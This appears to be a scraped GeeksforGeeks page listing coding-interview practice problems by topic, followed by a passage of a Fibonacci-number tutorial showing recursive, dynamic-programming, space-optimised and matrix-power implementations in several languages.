Practice for cracking any coding interview Last Updated: 19-06-2019 Coding questions in this article are difficulty wise ordered. The idea of this post is to target two types of people. Competitive Programming Preparation (For Ist and IInd Year Students) : It is recommended to finish all questions from all categories except possibly Linked List, Tree and BST. However at least 10 questions from these categories should also be covered. If you have never done competitive programming before, it is strongly recommended to see How to Begin with Competitive Programming first. If you wish to get yourself prepared with a language first, you may first begin C++ Track or Java Track Interview preparation It is recommended to cover all topics. In every every topic, you can start from questions according to your comfort level. The practice system tells you exactly the test case where your code failed. In case you need more clarity about a question, you may use expected output button to see output for your given input. You can also view successful submissions of others in case you are stuck. To see solution of others, please click “All Submissions” button at the bottom of problem statement. Topics : Mathematical Puzzles Arrays String Searching Sorting Hashing Matrix Recursion Divide & Conquer Linked List Doubly and Circular Linked Lists Stack Queue Prefix Sum and Sliding Window Bit Magic Tree Binary Search Tree Heap Graph Greedy Algorithms Dynamic Programming Backtracking Trie Misc Topics Important Links Mathematical : Print the pattern (You only need to write function here) Print table (This is a full code problem. Please see sample codes here before attempting the problem) Series AP Series GP Closest Number Armstrong Numbers Sum of digits of a number Reverse digits Print the Kth Digit Binary number to decimal number Jumping Numbers GCD of two numbers LCM of two numbers Add two fractions GCD of array Factorial of a number Compute nPr Compute nCr Largest prime factor Perfect Numbers Pair cube count Find Nth root of M Prime Number Sieve of Eratosthenes Sum of all prime numbers between 1 and N. Pairs of prime numbers Related Learning Resources : Mathematical Algorithms and Number Theory Puzzles Count Squares 3 Divisors Check if four points form a square Check for power Overlapping rectangles Trailing zeroes in factorial Angle between hour and minute hand Number Of Open Doors Triangular Numbers Nth Even Fibonacci Number Last two digit Fibonacci Squares in a Matrix Day of the week Related Learning Resources : Puzzles Arrays : Array operations (Search, insert, delete) Array alternate printing Maximum and minimum in an array Second largest in array Sum of array elements Reverse an Array Rotate Array Count of smaller elements Remove duplicate elements from sorted Array Count possible triangles Leaders in an array Minimum distance between two numbers Sorted subsequence of size 3 Maximum Sub Array Majority Element Wave Array Maximum Index Max sum path in two arrays Product array puzzle Find duplicates in a small ranged array Find Missing And Repeating Stock buy and sell Trapping Rain Water Pair with given sum in a sorted array Chocolate Distribution Problem Longest Consecutive subsequence Three way partitioning Related Learning Resources : Array Data Structure String : Check for palindrome Check for anagram Anagram Palindrome Title case conversion Sort the string Merge two strings Save Ironman Good or Bad string URLify a given string Extract Maximum Reverse words in a given string Implement strstr Check for subsequence Check for rotation Check if two strings are k-anagrams Uncommon characters Anagram Search First repeating character First non-repeating character Longest Distinct characters in string Longest Palindromic Substring Find k-th character in string Smallest window in a string containing all characters of another string Add Binary Strings Multiply two Strings Nearest multiple of 10 Related Learning Resources : String Data Structure Searching : Linear Search Facing the sun Magnet Array Problem Binary Search Floor in a Sorted Array Count occurrences in a sorted array Search in a sorted and rotated Find the missing number Missing element of AP Square root of a number Find Transition Point in a Sorted Binary Array Last index of One Peak element Allocate minimum number of pages Common elements in three sorted Smallest Positive missing number Related Learning Resources : Searching Algorithms Sorting : Check if array is sorted Sort a binary array Sort an array of 0s, 1s and 2s Bubble Sort Insertion Sort Selection Sort Quick Sort Merge Sort Sort an array when two halves are sorted Relative Sorting Triplet Sum in Array Minimum Swaps to Sort Sorting elements by frequency Triplet Family Count the triplets Related Learning Resources : Sorting Algorithms Hashing : Count distinct elements Array Subset of another array Nuts and Bolts Problem Count frequencies of elements Check if two arrays are equal or not First element to occur k times In First But Second Non-Repeating Element Group Anagrams Together Winner of an election Check for a pair with given sum Count distinct pairs with difference k Count pairs with given sum Find all four sum numbers A Simple Fraction Largest Fibonacci Subsequence Related Learning Resources : Hashing Data Structure Matrix : Transpose of Matrix Print Matrix in snake Pattern Print a given matrix in spiral form Is Sudoku Valid Count zeros in a sorted matrix Squares in a Matrix A Boolean Matrix Question Search in row-wise and column-wise sorted Find the row with maximum number of 1s Count pairs Sum in matrices Median In a Row-Wise sorted Matrix Related Learning Resources : Matrix Data Structure Recursion : Print Pattern Handshakes Tower of Hanoi Josephus problem Recursively remove all adjacent duplicates Possible words from Phone digits Flood fill Algorithm Permutations of a string Related Learning Resources : Recursion Divide & Conquer : Write your own power function Program for n-th Fibonacci Number K-th element of two sorted Arrays Median of two sorted arrays Karatsuba Algorithm The Painter’s Partition Problem Convex Hull Counting inversions Related Learning Resources : Divide and Conquer Algorithms Linked List : Print a Linked List Length of a linked list Node at a given index in linked list Middle of a linked list n-th node from end of a linked list Delete a node Remove every k’th node Delete N nodes after M nodes of a linked list Delete without head pointer Rearrange a linked list Segregate even and odd (Using only one traversal) Reorder List Polynomial Addition Insert in a Sorted List Swap nodes in pairs Reverse a linked list Reverse a Linked List in groups of given size. Check for palindrome Flattening a linked list Get intersection point Remove duplicates from sorted list Remove duplicates from unsorted lists Sort a linked list of 0s, 1s and 2s. Circular Linked List Detect loop in a linked list Find length of Loop Remove loop in a linked list Add two numbers represented by linked lists Clone a linked list with random pointers Add 1 to a number represented as linked list Add two numbers represented as linked list Multiply two linked lists Merge two sorted linked lists Merge Sort on Linked List Intersection of Two Linked Lists Union of Two Linked Lists Related Learning Resources : Linked List Data Structure Doubly and Circular Linked Lists Insert a node in Doubly linked list Delete node in Doubly Linked List Circular Linked List Traversal Split a Circular Linked List into two halves Insert in Sorted way in a Sorted DLL QuickSort on Doubly Linked List Merge Sort on Doubly Linked List Rotate doubly Linked List by P nodes XOR Linked List Related Learning Resources : Doubly Linked List and Circular Linked List. Stack Implement Stack using Array Implement Stack using Linked List Check for balanced parenthesis Reverse a stack Implement two stacks in an array Design a stack with getMin The celebrity problem Stock Span Problem Next Greater Element Next Smaller Element Longest valid Parentheses Related Learning Resources : Stack Data Structure Queue and Dequeue Implement Queue using Linked List Implement Queue using Array Implement Stack using Queue Implement Queue using Stack Reversing a Queue Circular tour Related Learning Resources : Queue Data Structure First non-repeating character in a stream Prefix Sum and Sliding Window Equilibrium Point Check if there is a subarray with 0 sun Longest Sub-Array with Sum K Longest subarray with sum divisible by K Largest subarray with equal 1s and 0s Longest common span with same number of 1s and 0s among two arrays Find mximum sum in any subarray of size k Count distinct elements in every window of size k Check for subarray with given sum Related Learning Resources : Prefix Sum and Sliding Window Bit Magic Check if a number is even or odd. Number of bit flips Game of XOR Find bit at a position Swap odd and even bits Power of 2 Odd occurring element Missing number in array Index Of an Extra Element Reverse Bits Count set bits Power Set Related Learning Resources : Bit Magic Tree Inorder Traversal Preorder Traversal Postorder Traversal Level order traversal Find height of Binary Tree Count Leaves in Binary Tree Check for Children Sum Property Mirror Tree Check for Balanced Tree Lowest Common Ancestor in a Binary Tree Diameter of Binary Tree Left View of Binary Tree Right View of Binary Tree Maximum path sum Level order traversal line by line Tree from Postorder and Inorder Tree from Preorder and Inorder Connect Nodes at Same Level Zig-Zag level order traversal Serialize and Deserialize a Binary Tree Leaves to DLL Binary Tree to Doubly Linked List Binary Tree to Circular Doubly Linked List Related Learning Resources : Tree Data Structure Binary Search Tree BST Search BST Insert BST Delete Minimum in BST Inorder Traversal and BST Count BST nodes that lie in a given range Add all greater values Predecessor and Successor in BST Closest Neighbor in BST Lowest Common Ancestor in a BST Convert Level Order Traversal to BST Normal BST to Balanced BST Pair with given sum in BST Check for BST Correct BST with two nodes swapped Median of BST k-th smallest element in BST Unique BST’s Array to BST Preorder Traversal and BST Preorder to Postorder Leaf nodes from preorder traversal Triplet with 0 sum in BST Merge two BST ‘s Largest BST Subtree Related Learning Resources : Binary Search Tree Heap Binary Heap Operations Height of Heap Heap Sort Sort a Nearly Sorted Array K Largest Elements K-th largest element in a stream Median of stream Merge k sorted arrays Related Learning Resources : Heap Data Structure Graph Print adjacency list Breadth First Search Depth First Search Find whether path exist Knight Walk Snake and Ladder Problem Bipartite Graph Detect Cycle in an undirected graph Detect Cycle in a directed graph Find first n numbers with given set of digits Rotten oranges Topological sort Shortest Source to Destination Path Transitive closure of a Graph Strongly Connected Components Related Learning Resources : Graph Data Structure Greedy Algorithms Fractional Knapsack Largest number with given sum Activity Selection N meetings in one room Minimum Platforms Minimum number of Coins Job Sequencing Problem Minimize the heights Huffman Coding Huffman Decoding Minimum Spanning Tree Dijkstra for Adjacency Matrix Related Learning Resources : Greedy Algorithms Dynamic Programming Print first n Fibonacci Numbers. Count ways to reach the n’th stair Cutted Segments Kadane’s Algorithm Stickler Thief Minimum number of jumps Total Decoding Messages Min Cost Path Coin Change Longest Common Subsequence Consecutive 1’s not allowed Edit Distance Rod Cutting Water Overflow Maximum Tip Calculator Longest Increasing Subsequence Maximum sum increasing subsequence Max length chain 0 – 1 Knapsack Problem Maximum Tip Calculator Interleaved string Longest Palindromic Subsequence Wildcard Pattern Matching Box Stacking Longest Bitonic subsequence Minimum sum partition Largest square formed in a matrix Word Break Matrix Chain Multiplication Special Keyboard Egg Dropping Puzzle Optimal Strategy for a Game Related Learning Resources : Dynamic Programming Backtracking Rat Maze With Multiple Jumps Coins and Game Hamiltonian Path Solve the Sudoku Combination Sum – Part 2 Combination Sum Subsets Largest number in K swaps M-Coloring Problem Black and White Related Learning Resources : Backtracking Trie Trie Search and Insert Trie Delete Unique rows in a binary matrix Count of distinct substrings Word Boggle Related Learning Resources : Trie Data Structure Misc Questions to test your overall learning Longest common prefix Implement Atoi Two numbers with sum closest to zero Smallest greater elements in whole array Max rectangle Find triplets with zero sum Counting elements in two arrays Merge K sorted linked lists Maximum Difference Circle of strings All possible Word Breaks Alien Dictionary Design a tiny URL or URL shortener Implement LRU Cache Important Links : Sudo Placement : For companies like Amazon, Microsoft, Adobe, .., etc Sudo Placement 2 : For companies like TCS, Infosys, Wipro, Cognizant, .. etc Aptitude questions asked in round 1 : Placements Course designed for this purpose. MCQs asked from different computer science subjects : Subject-Wise Quizzes Interview theory and coding questions of all companies : Company wise all practice questions. Interview experiences of all companies : Interview corner. Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Must Do Coding Questions Company-wise You may also check our latest online course series to learn DS & Algo is named DSA, which covers everything about Data Structures from Basic to Advanced. This is a 10 weeks long online certification program specializing in Data Structures & Algorithms which includes pre-recorded premium Video lectures & programming questions for practice. You will learn algorithmic techniques for solving various computational problems and will implement more than 200 algorithmic coding problems. This course offers you a wealth of programming challenges that you may face at your next job interview. The course focuses mainly on Data Structure & Algorithms: the key to selection in top product based companies. Key Features of the Course Well organised tutorials on Data-Structures and Algorithms prepared by the GeeksforGeeks Team. Premium video lectures by Mr. Sandeep Jain, Founder and C.E.O of GeeksforGeeks. Dedicated doubt solving team to assist you. Weekly Assessment Tests with Video Solutions. Performance-Based Certificate. Internship Opportunities at GeeksforGeeks. The courses are self-paced: Anyone can register anytime, make payment and begin the course. And, many more. The course is available in two versions: With Doubt Assistance: The price of the self-paced online DSA course with doubt assistance is INR 3,999. Click here to purchase your ticket. Without Doubt Assistance: The price of the self-paced online DSA course without doubt assistance is INR 2,499. Click here to purchase your ticket . My Personal Notes arrow_drop_up Save Recommended Posts:Cracking Technical Interviews; FreshersCracking Technical InterviewsAdvantages of cracking GATE from Indian PerspectiveWhat coding habits improve timing in coding contest?Geeks Coding Challenge [GCC 2019] - A Three Day Coding Challenge By GeeksforGeeksHow to Practice for the Technical Rounds in Interview?How to answer a coding question in an Interview?Recursive Practice Problems with SolutionsMust Do Coding Questions Company-wisePython Tricks for Competitive CodingWhy is python best suited for Competitive Coding?BFS using STL for competitive codingHow to attempt Function Coding Questions?Why Should I Learn Coding?I don't like Coding. What should I do to Get a Job in IT?7 Best Coding Challenge Websites in 2020How To Approach A Coding Problem ?How to win a Coding Contest?10 Tips to Defeat Your Fear of CodingCompetitive Coding Setup for C++ and Python in VS Code using Python ScriptIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArticlesCompetitive ProgrammingCareer-AdvicesInterview Tipsinterview-preparationplacement preparation thumb_up 118 To-do Done 3.5 Based on 52 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Apache POI | Getting Started Next last_page Distinct Prime Factors of Array Product Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 1 (Asymptotic Analysis)find command in Linux with examplesAnalysis of Algorithms | Set 3 (Asymptotic Notations) Most visited in Competitive Programming Why Java Language is Slower Than CPP for Competitive Programming?Arrow operator -> in C/C++ with ExamplesFast I/O for Competitive Programming7 Best Coding Challenge Websites in 2020Modulo 10^9+7 (1000000007) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Program for Fibonacci numbers - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Program for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationReverse an array in groups of given sizeK’th Smallest/Largest Element in Unsorted Array | Set 1K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time)K’th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time)K’th Smallest/Largest Element using STLk largest(or smallest) elements in an array | added Min Heap methodSort a nearly sorted (or K sorted) arrayMerge k sorted arrays | Set 1Largest Sum Contiguous Subarray0-1 Knapsack Problem | DP-10Longest Common Subsequence | DP-4Longest Increasing Subsequence | DP-3Subset Sum Problem | DP-25Longest Palindromic Substring | Set 1Sieve of EratosthenesTop 20 Dynamic Programming Interview Questions Program for Fibonacci numbers Last Updated: 25-11-2020 The Fibonacci numbers are the numbers in the following integer sequence.0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, …….. In mathematical terms, the sequence Fn of Fibonacci numbers is defined by the recurrence relation Fn = Fn-1 + Fn-2 with seed values F0 = 0 and F1 = 1. Given a number n, print n-th Fibonacci Number. Examples: Input : n = 2 Output : 1 Input : n = 9 Output : 34 Recommended: Please solve it on “PRACTICE ” first, before moving on to the solution. Write a function int fib(int n) that returns Fn. For example, if n = 0, then fib() should return 0. If n = 1, then it should return 1. For n > 1, it should return Fn-1 + Fn-2 For n = 9 Output:34 Following are different methods to get the nth Fibonacci number. Method 1 ( Use recursion ) A simple method that is a direct recursive implementation mathematical recurrence relation given above. C++ filter_none edit close play_arrow link brightness_4 code //Fibonacci Series using Recursion #include<bits/stdc++.h> using namespace std; int fib(int n) { if (n <= 1) return n; return fib(n-1) + fib(n-2); } int main () { int n = 9; cout << fib(n); getchar(); return 0; } // This code is contributed // by Akanksha Rai chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code //Fibonacci Series using Recursion #include<stdio.h> int fib(int n) { if (n <= 1) return n; return fib(n-1) + fib(n-2); } int main () { int n = 9; printf("%d", fib(n)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code //Fibonacci Series using Recursion class fibonacci { static int fib(int n) { if (n <= 1) return n; return fib(n-1) + fib(n-2); } public static void main (String args[]) { int n = 9; System.out.println(fib(n)); } } /* This code is contributed by Rajat Mishra */ chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Function for nth Fibonacci number def Fibonacci(n): if n<0: print("Incorrect input") # First Fibonacci number is 0 elif n==0: return 0 # Second Fibonacci number is 1 elif n==1: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) # Driver Program print(Fibonacci(9)) #This code is contributed by Saket Modi chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for Fibonacci Series // using Recursion using System; public class GFG { public static int Fib(int n) { if (n <= 1) { return n; } else { return Fib(n - 1) + Fib(n - 2); } } // driver code public static void Main(string[] args) { int n = 9; Console.Write(Fib(n)); } } // This code is contributed by Sam007 chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // Fibonacci Series // using Recursion // function returns // the Fibonacci number function fib($n) { if ($n <= 1) return $n; return fib($n - 1) + fib($n - 2); } // Driver Code $n = 9; echo fib($n); // This code is contributed by aj_36 ?> chevron_right filter_none Output 34 Time Complexity: T(n) = T(n-1) + T(n-2) which is exponential. We can observe that this implementation does a lot of repeated work (see the following recursion tree). So this is a bad implementation for nth Fibonacci number. fib(5) / \ fib(4) fib(3) / \ / \ fib(3) fib(2) fib(2) fib(1) / \ / \ / \ fib(2) fib(1) fib(1) fib(0) fib(1) fib(0) / \ fib(1) fib(0) Extra Space: O(n) if we consider the function call stack size, otherwise O(1). Method 2 ( Use Dynamic Programming ) We can avoid the repeated work done is method 1 by storing the Fibonacci numbers calculated so far. C++ filter_none edit close play_arrow link brightness_4 code // C++ program for Fibonacci Series // using Dynamic Programming #include<bits/stdc++.h> using namespace std; class GFG{ public: int fib(int n) { // Declare an array to store // Fibonacci numbers. // 1 extra to handle // case, n = 0 int f[n + 2]; int i; // 0th and 1st number of the // series are 0 and 1 f[0] = 0; f[1] = 1; for(i = 2; i <= n; i++) { //Add the previous 2 numbers // in the series and store it f[i] = f[i - 1] + f[i - 2]; } return f[n]; } }; // Driver code int main () { GFG g; int n = 9; cout << g.fib(n); return 0; } // This code is contributed by SoumikMondal chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code //Fibonacci Series using Dynamic Programming #include<stdio.h> int fib(int n) { /* Declare an array to store Fibonacci numbers. */ int f[n+2]; // 1 extra to handle case, n = 0 int i; /* 0th and 1st number of the series are 0 and 1*/ f[0] = 0; f[1] = 1; for (i = 2; i <= n; i++) { /* Add the previous 2 numbers in the series and store it */ f[i] = f[i-1] + f[i-2]; } return f[n]; } int main () { int n = 9; printf("%d", fib(n)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Fibonacci Series using Dynamic Programming class fibonacci { static int fib(int n) { /* Declare an array to store Fibonacci numbers. */ int f[] = new int[n+2]; // 1 extra to handle case, n = 0 int i; /* 0th and 1st number of the series are 0 and 1*/ f[0] = 0; f[1] = 1; for (i = 2; i <= n; i++) { /* Add the previous 2 numbers in the series and store it */ f[i] = f[i-1] + f[i-2]; } return f[n]; } public static void main (String args[]) { int n = 9; System.out.println(fib(n)); } } /* This code is contributed by Rajat Mishra */ chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Fibonacci Series using Dynamic Programming def fibonacci(n): # Taking 1st two fibonacci nubers as 0 and 1 f = [0, 1] for i in range(2, n+1): f.append(f[i-1] + f[i-2]) return f[n] print(fibonacci(9)) chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for Fibonacci Series // using Dynamic Programming using System; class fibonacci { static int fib(int n) { // Declare an array to // store Fibonacci numbers. // 1 extra to handle // case, n = 0 int []f = new int[n + 2]; int i; /* 0th and 1st number of the series are 0 and 1 */ f[0] = 0; f[1] = 1; for (i = 2; i <= n; i++) { /* Add the previous 2 numbers in the series and store it */ f[i] = f[i - 1] + f[i - 2]; } return f[n]; } // Driver Code public static void Main () { int n = 9; Console.WriteLine(fib(n)); } } // This code is contributed by anuj_67. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php //Fibonacci Series using Dynamic // Programming function fib( $n) { /* Declare an array to store Fibonacci numbers. */ // 1 extra to handle case, // n = 0 $f = array(); $i; /* 0th and 1st number of the series are 0 and 1*/ $f[0] = 0; $f[1] = 1; for ($i = 2; $i <= $n; $i++) { /* Add the previous 2 numbers in the series and store it */ $f[$i] = $f[$i-1] + $f[$i-2]; } return $f[$n]; } $n = 9; echo fib($n); // This code is contributed by // anuj_67. ?> chevron_right filter_none Output 34 Method 3 ( Space Optimized Method 2 ) We can optimize the space used in method 2 by storing the previous two numbers only because that is all we need to get the next Fibonacci number in series. C++ filter_none edit close play_arrow link brightness_4 code // Fibonacci Series using Space Optimized Method #include<bits/stdc++.h> using namespace std; int fib(int n) { int a = 0, b = 1, c, i; if( n == 0) return a; for(i = 2; i <= n; i++) { c = a + b; a = b; b = c; } return b; } // Driver code int main() { int n = 9; cout << fib(n); return 0; } // This code is contributed by Code_Mech chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // Fibonacci Series using Space Optimized Method #include<stdio.h> int fib(int n) { int a = 0, b = 1, c, i; if( n == 0) return a; for (i = 2; i <= n; i++) { c = a + b; a = b; b = c; } return b; } int main () { int n = 9; printf("%d", fib(n)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for Fibonacci Series using Space // Optimized Method class fibonacci { static int fib(int n) { int a = 0, b = 1, c; if (n == 0) return a; for (int i = 2; i <= n; i++) { c = a + b; a = b; b = c; } return b; } public static void main (String args[]) { int n = 9; System.out.println(fib(n)); } } // This code is contributed by Mihir Joshi chevron_right filter_none Python filter_none edit close play_arrow link brightness_4 code # Function for nth fibonacci number - Space Optimisataion # Taking 1st two fibonacci numbers as 0 and 1 def fibonacci(n): a = 0 b = 1 if n < 0: print("Incorrect input") elif n == 0: return a elif n == 1: return b else: for i in range(2,n+1): c = a + b a = b b = c return b # Driver Program print(fibonacci(9)) #This code is contributed by Saket Modi chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program for Fibonacci Series // using Space Optimized Method using System; namespace Fib { public class GFG { static int Fib(int n) { int a = 0, b = 1, c = 0; // To return the first Fibonacci number if (n == 0) return a; for (int i = 2; i <= n; i++) { c = a + b; a = b; b = c; } return b; } // Driver function public static void Main(string[] args) { int n = 9; Console.Write("{0} ", Fib(n)); } } } // This code is contributed by Sam007. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP program for Fibonacci Series // using Space Optimized Method function fib( $n) { $a = 0; $b = 1; $c; $i; if( $n == 0) return $a; for($i = 2; $i <= $n; $i++) { $c = $a + $b; $a = $b; $b = $c; } return $b; } // Driver Code $n = 9; echo fib($n); // This code is contributed by anuj_67. ?> chevron_right filter_none Output 34 Time Complexity:O(n) Extra Space: O(1) Method 4 ( Using power of the matrix {{1,1},{1,0}} ) This another O(n) which relies on the fact that if we n times multiply the matrix M = {{1,1},{1,0}} to itself (in other words calculate power(M, n )), then we get the (n+1)th Fibonacci number as the element at row and column (0, 0) in the resultant matrix.The matrix representation gives the following closed expression for the Fibonacci numbers: C++ filter_none edit close play_arrow link brightness_4 code #include<bits/stdc++.h> using namespace std; // Helper function that multiplies 2 // matrices F and M of size 2*2, and // puts the multiplication result // back to F[][] void multiply(int F[2][2], int M[2][2]); // Helper function that calculates F[][] // raise to the power n and puts the // result in F[][] // Note that this function is designed // only for fib() and won't work as // general power function void power(int F[2][2], int n); int fib(int n) { int F[2][2] = { { 1, 1 }, { 1, 0 } }; if (n == 0) return 0; power(F, n - 1); return F[0][0]; } void multiply(int F[2][2], int M[2][2]) { int x = F[0][0] * M[0][0] + F[0][1] * M[1][0]; int y = F[0][0] * M[0][1] + F[0][1] * M[1][1]; int z = F[1][0] * M[0][0] + F[1][1] * M[1][0]; int w = F[1][0] * M[0][1] + F[1][1] * M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } void power(int F[2][2], int n) { int i; int M[2][2] = { { 1, 1 }, { 1, 0 } }; // n - 1 times multiply the // matrix to {{1,0},{0,1}} for(i = 2; i <= n; i++) multiply(F, M); } // Driver code int main() { int n = 9; cout << " " << fib(n); return 0; } // This code is contributed by shivanisinghss2110 chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code #include <stdio.h> /* Helper function that multiplies 2 matrices F and M of size 2*2, and puts the multiplication result back to F[][] */ void multiply(int F[2][2], int M[2][2]); /* Helper function that calculates F[][] raise to the power n and puts the result in F[][] Note that this function is designed only for fib() and won't work as general power function */ void power(int F[2][2], int n); int fib(int n) { int F[2][2] = {{1,1},{1,0}}; if (n == 0) return 0; power(F, n-1); return F[0][0]; } void multiply(int F[2][2], int M[2][2]) { int x = F[0][0]*M[0][0] + F[0][1]*M[1][0]; int y = F[0][0]*M[0][1] + F[0][1]*M[1][1]; int z = F[1][0]*M[0][0] + F[1][1]*M[1][0]; int w = F[1][0]*M[0][1] + F[1][1]*M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } void power(int F[2][2], int n) { int i; int M[2][2] = {{1,1},{1,0}}; // n - 1 times multiply the matrix to {{1,0},{0,1}} for (i = 2; i <= n; i++) multiply(F, M); } /* Driver program to test above function */ int main() { int n = 9; printf("%d", fib(n)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code class fibonacci { static int fib(int n) { int F[][] = new int[][]{{1,1},{1,0}}; if (n == 0) return 0; power(F, n-1); return F[0][0]; } /* Helper function that multiplies 2 matrices F and M of size 2*2, and puts the multiplication result back to F[][] */ static void multiply(int F[][], int M[][]) { int x = F[0][0]*M[0][0] + F[0][1]*M[1][0]; int y = F[0][0]*M[0][1] + F[0][1]*M[1][1]; int z = F[1][0]*M[0][0] + F[1][1]*M[1][0]; int w = F[1][0]*M[0][1] + F[1][1]*M[1][1]; F[0][0] = x; F[0][1] = y; F[1][0] = z; F[1][1] = w; } /* Helper function that calculates F[][] raise to the power n and puts the result in F[][] Note that this function is designed only for fib() and won't work as general power function */ static void power(int F[][], int n) { int i; int M[][] = new int[][]{{1,1},{1,0}}; // n - 1 times multiply the matrix to {{1,0},{0,1}} for (i = 2; i <= n; i++) multiply(F, M); } /* Driver program to test above function */ public static void main (String args[]) { int n = 9; System.out.println(fib(n)); } } /* This code is contributed by Rajat Mishra */ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Helper function that multiplies # 2 matrices F and M of size 2*2, # and puts the multiplication # result back to F[][] # Helper function that calculates # F[][] raise to the power n and # puts the result in F[][] # Note that this function is # designed only for fib() and # won't work as general # power function def fib(n): F = [[1, 1], [1, 0]] if (n == 0): return 0 power(F, n - 1) return F[0][0] def multiply(F, M): x = (F[0][0] * M[0][0] + F[0][1] * M[1][0]) y = (F[0][0] * M[0][1] + F[0][1] * M[1][1]) z = (F[1][0] * M[0][0] + F[1][1] * M[1][0]) w = (F[1][0] * M[0][1] + F[1][1] * M[1][1]) F[0][0] = x F[0][1] = y F[1][0] = z F[1][1] = w def power(F, n): M = [[1, 1], [1, 0]] # n - 1 times multiply the # matrix to {{1,0},{0,1}} for i in range(2, n + 1): multiply(F, M) # Driver Code if __name__ == "__main__": n = 9 print(fib(n)) # This code is contributed # by ChitraNayal chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code using System; class GFG { static int fib(int n) { int [,]F = new int[,] {{1, 1}, {1, 0} }; if (n == 0) return 0; power(F, n-1); return F[0,0]; } /* Helper function that multiplies 2 matrices F and M of size 2*2, and puts the multiplication result back to F[][] */ static void multiply(int [,]F, int [,]M) { int x = F[0,0]*M[0,0] + F[0,1]*M[1,0]; int y = F[0,0]*M[0,1] + F[0,1]*M[1,1]; int z = F[1,0]*M[0,0] + F[1,1]*M[1,0]; int w = F[1,0]*M[0,1] + F[1,1]*M[1,1]; F[0,0] = x; F[0,1] = y; F[1,0] = z; F[1,1] = w; } /* Helper function that calculates F[][] raise to the power n and puts the result in F[][] Note that this function is designed only for fib() and won't work as general power function */ static void power(int [,]F, int n) { int i; int [,]M = new int[,]{{1, 1}, {1, 0} }; // n - 1 times multiply the matrix to // {{1,0},{0,1}} for (i = 2; i <= n; i++) multiply(F, 